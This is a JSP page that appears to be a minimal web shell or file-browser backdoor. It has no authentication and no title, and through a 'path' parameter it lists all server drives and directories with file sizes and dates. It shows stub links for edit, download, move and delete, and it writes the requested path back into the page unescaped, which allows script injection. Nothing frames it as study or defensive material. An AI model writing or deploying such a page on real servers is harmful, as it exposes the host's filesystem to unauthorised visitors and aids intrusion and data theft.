<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@page import="java.io.*,java.util.*,java.net.*"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title></title>
<style type="text/css">
td,select,input,body {
	font-size: 9pt;
}

A {
	text-decoration: none
}

#tablist {
	padding: 5px 0;
	margin-left: 0;
	margin-bottom: 0;
	margin-top: 0.1em;
	font: 9pt;
}

#tablist li {
	list-style: none;
	display: inline;
	margin: 0;
}

#tablist li a {
	padding: 3px 0.5em;
	margin-left: 3px;
	border: 1px solid;
	background: #FFFFFF;
}

#tablist li a:link,#tablist li a:visited {
	color: navy;
}

#tablist li a.current {
	background: #FFFFFF;
}

#tabcontentcontainer {
	width: 100%;
	padding: 5px;
	border: 1px solid black;
}

.tabcontent {
	display: none;
}
</style>
</head>
<body>

<%!private final static int languageNo = 1; //语言版本，0 : 中文； 1：英文
	String[] strCurrentFolder = { "当前目录", "Current Folder" };
	String[] strDrivers = { "驱动器", "Drivers" };
	String[] strFileName = { "文件名称", "File Name" };
	String[] strFileSize = { "文件大小", "File Size" };
	String[] strLastModified = { "最后修改", "Last Modified" };
	String[] strFileOperation = { "文件操作", "Operations" };
	String[] strFileEdit = { "修改", "Edit" };
	String[] strFileDown = { "下载", "Download" };
	String[] strFileCopy = { "复制", "Move" };
	String[] strFileDel = { "删除", "Delete" };

	String getDrivers() {
		StringBuffer sb = new StringBuffer(": ");
		File roots[] = File.listRoots();
		for (int i = 0; i < roots.length; i++) {
			sb.append("<a href='?path=" + roots[i] + "'>");
			sb.append(roots[i] + "</a> &nbsp;&nbsp;");
		}
		return sb.toString();
	}

	String formatPath(String p) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < p.length(); i++) {
			if (p.charAt(i) == '\\') {
				sb.append("\\\\");
			} else {
				sb.append(p.charAt(i));
			}
		}
		return sb.toString();
	}

	public static String toChinese(String str) {
		try {
			if (str == null) {
				return "";
			} else {
				str = new String(str.getBytes("ISO8859_1"), "GBK");
				return str;
			}

		} catch (Exception e) {
			return "";
		}
	}%>
<%
	request.setCharacterEncoding("gb2312");
	String strDir = toChinese(request.getParameter("path"));
	if (strDir == null || strDir.length() < 1) {
		strDir = request.getRealPath("/");
	}

	StringBuffer sb = new StringBuffer("");
	StringBuffer sbFile = new StringBuffer("");
	try {

		File objFile = new File(strDir);
		File list[] = objFile.listFiles();
		if (objFile.getAbsolutePath().length() > 3) {
			sb.append("<tr><td >&nbsp;</td><td><a href='?path="
					+ formatPath(objFile.getParentFile

					().getAbsolutePath()) + "'>");
			sb.append("To ParentFile</a><br>- - - - </td></tr>\r\n");
		}
		for (int i = 0; i < list.length; i++) {
			if (list[i].isDirectory()) {
				sb.append("<tr><td>&nbsp;</td><td>");
				sb.append("<a href='?path="
						+ formatPath(list[i].getAbsolutePath()) + "'>"
						+ list[i].getName() + "</a>");
				sb.append("</td></tr>");

			} else {
				String strLen = "";
				String strDT = "";
				long lFile = 0;
				lFile = list[i].length();

				if (lFile > 1000000) {
					lFile = lFile / 1000000;
					strLen = "" + lFile + " M";
				} else if (lFile > 1000) {
					lFile = lFile / 1000;
					strLen = "" + lFile + " K";
				} else {
					strLen = "" + lFile + " Byte";
				}
				Date dt = new Date(list[i].lastModified());
				strDT = dt.toLocaleString();
				sbFile.append("<tr><td>");
				sbFile.append("" + list[i].getName());
				sbFile.append("</td><td>");
				sbFile.append("" + strLen);
				sbFile.append("</td><td>");
				sbFile.append("" + strDT);
				sbFile.append("</td><td>");
				sbFile.append(" <a href=>");
				sbFile.append(strFileEdit[languageNo] + "</a> ");
				sbFile.append(" <a href=>");
				sbFile.append(strFileDown[languageNo] + "</a> ");
				sbFile.append(" <a href=>");
				sbFile.append(strFileCopy[languageNo] + "</a> ");
				sbFile.append(" <a href=>");
				sbFile.append(strFileDel[languageNo] + "</a> ");
				sbFile.append("</td></tr>\r\n");
			}
		}
	} catch (Exception e) {
		out.println("<font color=red>error： " + e.toString()
				+ "</font>");
	}
%>
<table border='1' width='100%' bgcolor='#FFFFFF' cellspacing=0
	cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF>
	<tr>
		<td width='20%'><%=strCurrentFolder[languageNo]%>:<br><%=strDir%></td>
		<td width='70%'><%=strDrivers[languageNo]%><%=getDrivers()%></td>
	</tr>
</table>
<table border='1' width='100%' bgcolor='#FFFFFF' cellspacing=0
	cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF>
	<tr>
		<td width='20%' valign="top">
		<table>
			<tr>
				<td><%=sb%></td>
			</tr>
		</table>
		</td>
		<td width='70%' align="center" valign="top">
		<table width="100%" border="1" cellspacing="1" cellpadding="4"
			bordercolorlight="#000000" bordercolordark="#FFFFFF">
			<tr>
				<td width="26%" align="center"><%=strFileName[languageNo]%></td>
				<td width="19%" align="center"><%=strFileSize[languageNo]%></td>
				<td width="29%" align="center"><%=strLastModified[languageNo]%></td>
				<td width="26%" align="center"><%=strFileOperation[languageNo]%></td>
			</tr>
			<tr>
				<td width="25%" align="center"><%=sbFile%></td>
			</tr>
		</table>
		</td>
	</tr>
</table>
</body>
</html>